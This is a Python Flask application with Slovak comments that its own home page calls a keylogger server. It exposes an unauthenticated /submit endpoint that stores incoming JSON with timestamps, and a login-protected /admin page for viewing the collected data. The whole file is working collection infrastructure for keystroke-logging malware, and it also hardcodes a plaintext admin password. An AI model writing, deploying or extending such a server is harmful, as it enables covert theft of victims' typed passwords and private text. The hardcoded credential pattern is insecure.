from flask import Flask, request, render_template, redirect, url_for, session
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)  # pre session

# Jednoduchá user databáza (len demo)
USERS = {
    "admin": "120202810428Jm!"
}

DATA = []

@app.route('/')
def home():
    return "✅ Keylogger server je online."

@app.route('/submit', methods=['POST'])
def submit():
    json_data = request.json
    json_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    DATA.append(json_data)
    return {"status": "received"}

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in USERS and USERS[username] == password:
            session['user'] = username
            return redirect(url_for('admin'))
        else:
            return render_template("login.html", error="Nesprávne meno alebo heslo")
    return render_template("login.html")

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))

@app.route('/admin')
def admin():
    if 'user' not in session:
        return redirect(url_for('login'))
    return render_template("admin.html", data=DATA)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)






